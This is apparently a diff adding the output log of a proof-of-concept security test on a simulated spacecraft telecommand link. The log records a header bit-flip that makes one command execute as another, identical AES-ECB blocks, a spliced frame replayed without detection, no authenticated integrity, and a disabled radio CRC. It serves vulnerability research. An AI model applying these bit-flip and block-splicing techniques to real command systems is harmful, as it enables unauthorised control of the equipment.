@@ -1,0 +1,20 @@
+[   0.000] ========================================================================
+[   0.000] V-12 silent TC bit-flip / block swap
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x1D via=radio AES  payload=0a0001
+[   0.000] <-- TM apid=0x1D clear len=4
+[   0.001] <-- TM apid=0x1A clear len=8
+[   0.001] flipped primary-header bit 0: SB_PUBLISH(0x1B) executed as SET_LOG_NAME(0x1A) with the SAME ciphertext -> privilege mixup
+[   0.001] ECB determinism: identical publishes give identical ciphertext blocks -> True
+[   0.002] --> advance(200 ms)
+[   0.002] --> TC apid=0x1D via=radio AES  payload=00
+[   0.002] <-- TM apid=0x1D clear len=18
+[   0.002] spliced publish: frame built from A's capture -> tilt 4.49 (B's value replayed, no error, no replay detection)
+[   0.003] <-- TM apid=0x09 AES len=17
+[   0.003] one flipped bit -> random reject ['AES DECRYPT FAIL'] -- never an AUTHENTICATED integrity verdict
+[   0.003] --> TC apid=0x20 via=radio AES  payload=-
+[   0.003] <-- TM apid=0x20 clear len=18
+[   0.003] radio CRC disabled by default: mutated TCs execute silently
+[   0.003] ========================================================================
+[   0.003] POC OK
+[   0.003] ========================================================================
